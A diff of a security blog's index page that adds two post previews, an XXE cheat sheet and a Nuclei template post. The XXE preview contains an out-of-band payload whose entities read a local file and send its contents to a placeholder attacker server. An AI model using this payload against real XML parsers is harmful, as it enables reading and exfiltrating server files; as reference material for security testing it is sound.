@@ -61,7 +61,33 @@
         <div class="search-results" id="search-results" data-placeholder="No Results" style="display: none;"></div>
       </div>
       
-    </li><li><a class="post-link" href="/note/2020/08/10/terminal_output_cheatsheet.html">
+    </li><li><a class="post-link" href="/security/2020/08/13/XXE_Cheat_Sheet.html">
+          <h2 class="post-title">XXE_Cheat_sheet</h2>
+        </a>
+        <div class="post-meta">
+          <div class="post-date">
+            <i class="icon-calendar"></i>
+            Aug 13, 2020
+          </div><ul class="post-categories"><li>Security</li></ul></div>
+        <div class="post"><p><br /></p>
+<h3 id="xxe-oob-over-dns">XXE-OOB-Over-DNS</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % data SYSTEM "file:///tmp/foo"&gt;
+&lt;!ENTITY % url "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://%data;.my.evil.server'&gt;"&gt;
+</code></pre></div></div>
+<p><br />
+<br /></p>
+</div>
+      </li><li><a class="post-link" href="/security/2020/08/13/about_nuclei_tamplate.html">
+          <h2 class="post-title">Let&#39;s make Nuclei Template</h2>
+        </a>
+        <div class="post-meta">
+          <div class="post-date">
+            <i class="icon-calendar"></i>
+            Aug 13, 2020
+          </div><ul class="post-categories"><li>Security</li></ul></div>
+        <div class="post"><p><img src="/assets/nuclei-logo.png" alt="Nuclei_logo" /></p>
+</div>
+      </li><li><a class="post-link" href="/note/2020/08/10/terminal_output_cheatsheet.html">
           <h2 class="post-title">terminal output pipe command cheatsheet.</h2>
         </a>
         <div class="post-meta">
